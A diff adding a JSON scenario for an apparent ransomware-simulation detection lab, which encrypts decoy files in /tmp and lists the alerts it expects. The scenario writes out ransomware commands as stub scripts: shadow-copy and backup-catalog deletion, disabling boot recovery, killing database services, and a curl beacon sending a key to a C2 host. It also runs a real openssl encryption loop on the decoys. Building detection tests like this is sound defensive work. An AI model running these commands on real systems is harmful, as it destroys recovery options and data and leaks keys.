@@ -1,0 +1,70 @@
+{
+  "scenario_id": "ransomware_sim_001",
+  "name": "Ransomware Sim — Shadow Copy Delete Stub, Mass Encryption Staging, Ransom Note Drop",
+  "class_name": "impact",
+  "mode": "lab_only",
+  "risk_level": "critical",
+  "hosts": ["workstation-1"],
+  "preconditions": ["telemetry collector active", "victim filesystem seeded with decoy files"],
+  "behavior_profile": {
+    "pre_encryption": true,
+    "encryption_sim": true,
+    "impact_drop": true,
+    "cleanup": true
+  },
+  "custom_behaviors": {
+    "pre_encryption": [
+      {"step_id": "seed_target_files", "command": "mkdir -p /tmp/ClawdianShield/victim_docs && for i in 1 2 3 4 5; do echo \"Confidential document $i - Company IP\" > /tmp/ClawdianShield/victim_docs/report_$i.docx; done && echo 'financial_data,q1_revenue,5000000' > /tmp/ClawdianShield/victim_docs/finance.xlsx"},
+      {"step_id": "kill_processes_stub", "command": "echo 'pkill -f mysqld; pkill -f postgres; pkill -f apache; pkill -f nginx' > /tmp/ClawdianShield/kill_services.sh && chmod +x /tmp/ClawdianShield/kill_services.sh"},
+      {"step_id": "disable_recovery_stub", "command": "echo 'vssadmin delete shadows /all /quiet' > /tmp/ClawdianShield/shadow_delete.sh && echo 'wbadmin delete catalog -quiet' >> /tmp/ClawdianShield/shadow_delete.sh && echo 'bcdedit /set {default} recoveryenabled No' >> /tmp/ClawdianShield/shadow_delete.sh"},
+      {"step_id": "enumerate_targets", "command": "find /tmp/ClawdianShield/victim_docs -type f 2>/dev/null > /tmp/ClawdianShield/encryption_target_list.txt"},
+      {"step_id": "read_target_metadata", "command": "stat /tmp/ClawdianShield/victim_docs/* 2>/dev/null | grep -E 'File|Size' > /tmp/ClawdianShield/file_metadata.txt || true"}
+    ],
+    "encryption_sim": [
+      {"step_id": "openssl_encrypt_each", "command": "for f in /tmp/ClawdianShield/victim_docs/*; do openssl enc -aes-256-cbc -pbkdf2 -pass pass:RansomKey_LAB_ONLY -in \"$f\" -out \"${f}.enc\" 2>/dev/null; done || true"},
+      {"step_id": "rename_encrypted_files", "command": "for f in /tmp/ClawdianShield/victim_docs/*.enc; do mv \"$f\" \"${f%.enc}.locked\" 2>/dev/null; done || true"},
+      {"step_id": "delete_originals_stub", "command": "echo 'rm -f /tmp/ClawdianShield/victim_docs/*.docx /tmp/ClawdianShield/victim_docs/*.xlsx' > /tmp/ClawdianShield/wipe_originals_stub.sh"},
+      {"step_id": "verify_encryption_count", "command": "ls /tmp/ClawdianShield/victim_docs/*.locked 2>/dev/null | wc -l > /tmp/ClawdianShield/encrypted_count.txt || echo '0' > /tmp/ClawdianShield/encrypted_count.txt"}
+    ],
+    "impact_drop": [
+      {"step_id": "ransom_note_drop", "command": "printf 'YOUR FILES HAVE BEEN ENCRYPTED [LAB SIMULATION ONLY]\n\nThis is a ClawdianShield detection test. No real ransomware is present.\nScenario ID: ransomware_sim_001\n\nIn a real attack, payment instructions and contact info appear here.\n' > /tmp/ClawdianShield/victim_docs/READ_ME_NOW.txt && cp /tmp/ClawdianShield/victim_docs/READ_ME_NOW.txt /tmp/ClawdianShield/README_LAB.txt"},
+      {"step_id": "wallpaper_change_stub", "command": "echo 'gsettings set org.gnome.desktop.background picture-uri file:///tmp/ClawdianShield/ransom_wallpaper.png' > /tmp/ClawdianShield/wallpaper_stub.sh"},
+      {"step_id": "c2_beacon_stub", "command": "echo 'curl -s -X POST https://c2.example.com/keys -d \"{\\\"victim_id\\\":\\\"$(hostname)\\\",\\\"key\\\":\\\"AES_KEY_LAB\\\"}\"' > /tmp/ClawdianShield/c2_exfil_stub.sh"},
+      {"step_id": "collect_impact_summary", "command": "echo \"encrypted=$(cat /tmp/ClawdianShield/encrypted_count.txt) ransom_note=$(ls /tmp/ClawdianShield/victim_docs/READ_ME_NOW.txt 2>/dev/null && echo yes || echo no)\" > /tmp/ClawdianShield/impact_summary.txt"}
+    ]
+  },
+  "custom_behavior_techniques": {
+    "pre_encryption": "T1490",
+    "encryption_sim": "T1486",
+    "impact_drop": "T1491.001"
+  },
+  "custom_behavior_produces": {
+    "pre_encryption": ["process_events", "file_events"],
+    "encryption_sim": ["file_events", "hash_deltas", "process_events"],
+    "impact_drop": ["file_events", "process_events"]
+  },
+  "expected_telemetry": {
+    "file_events": true,
+    "hash_deltas": true,
+    "process_events": true
+  },
+  "detections_expected": [
+    "mass_file_encryption_detected",
+    "ransom_note_written",
+    "openssl_bulk_invocation",
+    "shadow_copy_delete_command",
+    "file_rename_to_locked_extension"
+  ],
+  "success_criteria": [
+    "openssl bulk encryption loop produces process_events per file",
+    ".locked extension rename chain detected by file_observer",
+    "READ_ME_NOW.txt creation in victim_docs triggers high-severity alert",
+    "shadow_delete.sh written triggers impact pre-condition alert"
+  ],
+  "safety_constraints": {
+    "lab_environment_only": true,
+    "no_real_file_deletion": true,
+    "no_real_network_c2": true,
+    "no_unapproved_network_spread": true
+  }
+}
